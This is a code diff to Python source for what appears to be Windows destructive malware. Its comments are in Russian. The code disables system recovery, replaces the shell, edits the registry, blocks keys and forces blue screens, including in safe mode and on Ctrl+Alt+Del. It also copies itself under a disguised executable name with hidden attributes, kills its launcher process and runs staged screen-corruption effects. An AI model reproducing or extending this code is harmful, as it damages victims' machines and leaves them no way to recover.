@@ -8,14 +8,13 @@ import time
 import tempfile
 from collections import defaultdict
 from gui import run_app
-from regedit_and_virus_safe import BSOD
-from multimedia import playMusic_runappmain, play_video_fullscreen, playmusic_for3, monitor_process, set_file_attributes
+from regedit_and_virus_safe import BSOD, apply_registry_mode
+from multimedia import playMusic_runappmain, play_video_fullscreen, playmusic_for3, monitor_process, set_file_attributes, remove_file_attributes, monitor_mei_folders
 
 from regedit_and_virus_safe import (
     destroy_all_recovery,
     change_shell,
     monitor_explorer,
-    MinusRegedit,
     block_keys,
     ctrt_alt_BSOD)
 
@@ -62,12 +61,27 @@ def check_safemode():
                 BSOD()
             else:
                 print("[INFO] Система НЕ в безопасном режиме. Действие не требуется.")
-
+                
         except Exception as e:
             print(f"[ERROR] Отвал при проверке безопасного режима: {e}")
     threading.Thread(target=runner, daemon=True).start()
 
 
+def kill_parent_stub():
+    try:
+        current_process = psutil.Process(os.getpid())
+        parent_process = current_process.parent()
+
+        if parent_process is not None:
+            parent_name = parent_process.name().lower()
+            print(f"[INFO] Завершаем родительский процесс: PID={parent_process.pid}, Name={parent_name}")
+            parent_process.terminate()
+            parent_process.wait(timeout=5)
+        else:
+            print("[INFO] Родительский процесс не найден")
+    except Exception as e:
+        print(f"[ERROR] Не удалось завершить родительский процесс: {e}")
+        
 def delete_mei():
     temp_dir = tempfile.gettempdir()
     current_meipass = getattr(sys, "_MEIPASS", "")
@@ -90,25 +104,26 @@ def delete_mei():
 
 
 def copyicons():
-    icon_files = ['1.ico', '2.ico', '4.ico', '6.ico']
-    for icon in icon_files:
-        icon_path = resource_path(icon)  # Получаем абсолютный путь к иконке
-        if os.path.exists(icon_path):
-            target_icon_path = os.path.join(TARGET_DIR, icon)  # Путь к целевой папке
-            print(f"Проверка целевой папки: {target_icon_path}")  # Добавим вывод целевой папки
-            # Если файл уже существует, не копируем
-            if not os.path.exists(target_icon_path):
-                try:
-                    shutil.copy(icon_path, target_icon_path)
-                    set_file_attributes(file_path=target_icon_path)
-                    print(f"Успешно скопирован файл иконки: {icon}")
-                except Exception as e:
-                    print(f"Ошибка копирования {icon}: {e}")
+    def icons_threading():
+        icon_files = ['1.ico', '2.ico', '4.ico', '6.ico']
+        for icon in icon_files:
+            icon_path = resource_path(icon)  # Получаем абсолютный путь к иконке
+            if os.path.exists(icon_path):
+                target_icon_path = os.path.join(TARGET_DIR, icon)  # Путь к целевой папке
+                print(f"[CHECK] Проверка целевой папки: {target_icon_path}")  # Добавим вывод целевой папки
+                # Если файл уже существует, не копируем
+                if not os.path.exists(target_icon_path):
+                    try:
+                        shutil.copy(icon_path, target_icon_path)
+                        set_file_attributes(file_path=target_icon_path)
+                        print(f"[END] Успешно скопирован файл иконки: {icon}")
+                    except Exception as e:
+                        print(f"[ERROR] Ошибка копирования {icon}: {e}")
+                else:
+                    print(f"[INFO] Файл {icon} уже существует в целевой папке.")
             else:
-                print(f"Файл {icon} уже существует в целевой папке.")
-        else:
-            print(f"Файл иконки {icon} не найден в resources.")
-
+                print(f"[ERROR] Файл иконки {icon} не найден в resources.")
+    threading.Thread(target=icons_threading, daemon=True).start()
 
 def copy_to_target(new_name="c_computeaccelerator.exe"):
     try:
@@ -139,19 +154,20 @@ def copy_to_target(new_name="c_computeaccelerator.exe"):
         return False
 
 
-def changetoeng():
-    LANG_ENGLISH_US = 0x0409  # Код для английской раскладки
-    HWND_BROADCAST = 0xFFFF
-    WM_INPUTLANGCHANGEREQUEST = 0x0050
+#def changetoeng(): #useless now
+ #   LANG_ENGLISH_US = 0x0409  # Код для английской раскладки
+  #  HWND_BROADCAST = 0xFFFF
+   # WM_INPUTLANGCHANGEREQUEST = 0x0050
     # Загрузка раскладки
-    def set_keyboard_layout(language_code):
-        user32 = ctypes.WinDLL("user32")
-        layout = user32.LoadKeyboardLayoutW(f"{language_code:04X}{language_code:04X}", 1)
-        user32.PostMessageW(HWND_BROADCAST, WM_INPUTLANGCHANGEREQUEST, 0, layout)
-    set_keyboard_layout(LANG_ENGLISH_US)
+    #def set_keyboard_layout(language_code):
+     #   user32 = ctypes.WinDLL("user32")
+      #  layout = user32.LoadKeyboardLayoutW(f"{language_code:04X}{language_code:04X}", 1)
+       # user32.PostMessageW(HWND_BROADCAST, WM_INPUTLANGCHANGEREQUEST, 0, layout)
+    #set_keyboard_layout(LANG_ENGLISH_US)
 
 
 def checkexe():
+    print("[START] Checkexe started")
     EXECUTABLE_EXTENSIONS = {".exe", ".bat", ".cmd", ".vbs", ".ps1"}
     tracked_apps = set()
     tracked_pids = set()
@@ -163,20 +179,20 @@ def checkexe():
         45: False, 50: False
     }
     actions = {
-        2: lambda: (print("2"), starticonscursor()),
-        4: lambda: (print("4"), starterrors()),
-        8: lambda: (print("8"), startsmelt()),
-        12: lambda: (print("12"), startdrawimages()),
-        16: lambda: (print("16"), starttunnel()),
-        18: lambda: (print("18"), startvoid()),
-        20: lambda: (print("20"), startinvert()),
-        24: lambda: (print("24"), startrastagHori()),
-        28: lambda: (print("28"), startmelt()),
-        30: lambda: (print("30"), startsines()),
-        35: lambda: (print("35"), startpanscreen()),
-        40: lambda: (print("40"), startrottun()),
-        45: lambda: (print("45"), startswipescreen()),
-        50: lambda: (print("50"), starthell())
+        2: lambda: (print("[GDI] 2"), starticonscursor()),
+        4: lambda: (print("[GDI] 4"), starterrors()),
+        8: lambda: (print("[GDI] 8"), startsmelt()),
+        12: lambda: (print("[GDI] 12"), startdrawimages()),
+        16: lambda: (print("[GDI] 16"), starttunnel()),
+        18: lambda: (print("[GDI] 18"), startvoid()),
+        20: lambda: (print("[GDI] 20"), startinvert()),
+        24: lambda: (print("[GDI] 24"), startrastagHori()),
+        28: lambda: (print("[GDI] 28"), startmelt()),
+        30: lambda: (print("[GDI] 30"), startsines()),
+        35: lambda: (print("[GDI] 35"), startpanscreen()),
+        40: lambda: (print("[GDI] 40"), startrottun()),
+        45: lambda: (print("[GDI] 45"), startswipescreen()),
+        50: lambda: (print("[GDI] 50"), starthell())
     }
 
     # Планировщик запуска функций с таймером
@@ -226,67 +242,60 @@ def checkexe():
             if total_processes >= threshold and not triggered_events[threshold]:
                 triggered_events[threshold] = True
                 actions[threshold]()
-        time.sleep(0.5)
+        time.sleep(2)
 
 
 def checktxt():
-    try:
-        if os.path.exists(file_path):
-            set_file_attributes(file_path)
-            with open(file_path, "r") as f:
-                content = f.read().strip()
 
-            if content == "1":
+    def first_state():
+        def china():
+            try:
+                remove_file_attributes(file_path)
+                with open(file_path, "w") as f:
+                        f.write("1")
+                        set_file_attributes(file_path)
                 copyicons()
                 copy_to_target(new_name="c_computeaccelerator.exe")
                 change_shell()
                 destroy_all_recovery()
-                MinusRegedit()
+                threading.Thread(target=apply_registry_mode, args=("minus",)).start()
                 playMusic_runappmain()
                 run_app()
+            except Exception as e:
+                print(f"Error: {e}")
+        threading.Thread(target=china).start()        
 
+    try:
+        if os.path.exists(file_path):
+            with open(file_path, "r") as f:
+                content = f.read().strip()
+
+            if content == "1":
+                first_state()
 
             elif content == "2":
                 play_video_fullscreen(video_path=resource_path("Hacker.mp4"))
 
             elif content == "3":
+
                 playmusic_for3()
 
-                process_monitor_threading = threading.Thread(target=monitor_process)
-                process_monitor_threading.start()
+                threading.Thread(target=apply_registry_mode, args=("monitor",), daemon=True).start()
+                threading.Thread(target=monitor_process).start()
+                threading.Thread(target=checkexe).start()    
 
                 os.startfile(resource_path("BTDevManager.exe"))
 
-                checkexe_threading = threading.Thread(target=checkexe)
-                checkexe_threading.start()
+                threading.Thread(target=monitor_explorer).start()
+                threading.Thread(target=monitor_mei_folders).start()
 
-                explorer_monitor_threading = threading.Thread(target=monitor_explorer(poll_interval=1))
-                explorer_monitor_threading.start()
 
-            else:
-                with open(file_path, "w") as f:
-                    f.write("1")
-                copyicons()
-                copy_to_target(new_name="c_computeaccelerator.exe")
-                set_file_attributes(file_path)
-                change_shell()
-                destroy_all_recovery()
-                changetoeng()
-                MinusRegedit()
-                playMusic_runappmain()
-                run_app()
-        else:
-            with open(file_path, "w") as f:
-                f.write("1")
-            set_file_attributes(file_path)
-            copyicons()
-            copy_to_target(new_name="c_computeaccelerator.exe")
-            change_shell()
-            destroy_all_recovery()
-            changetoeng()
-            MinusRegedit()
-            playMusic_runappmain()
-            run_app()
+
+            else: # Если другая цифра
+                first_state()
+
+        else: # Если файла нет
+            first_state()
 
     except Exception as e:
         print(f"Error: {e}")
@@ -296,6 +305,9 @@ if __name__ == "__main__":
 
     check_safemode()
     delete_mei()
+
+    kill_process = threading.Thread(target=kill_parent_stub)
+    kill_process.start()
 
     wait = threading.Thread(target=ctrt_alt_BSOD)
     wait.start()
